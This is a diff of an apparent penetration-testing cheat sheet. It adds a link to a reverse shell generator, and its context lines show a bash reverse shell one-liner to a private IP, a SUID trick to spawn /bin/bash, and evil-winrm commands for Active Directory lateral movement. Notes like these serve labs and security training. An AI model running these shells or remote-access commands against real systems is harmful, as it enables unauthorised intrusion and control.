@@ -4,6 +4,9 @@
 Reverse Shell simple Bash Script:
 #!/bin/bash
 bash -i >& /dev/tcp/10.10.62.51/4545 0>&1
+
+Reverse Shell Generator:
+    ->https://www.revshells.com/
 ########## 
  
 As we can set SUID bits, a simple executable that will run /bin/bash on the target system will do the job:
@@ -223,6 +226,8 @@ AD Enumeration Lateral Movement
 ####################
     evil-winrm -i <ip> -u <svcUser> -p <password>
     evil-winrm -u <> -p <> -i <>
+
+
 
 ####################
 Check DNS for SYSVOL in AD Enumeration
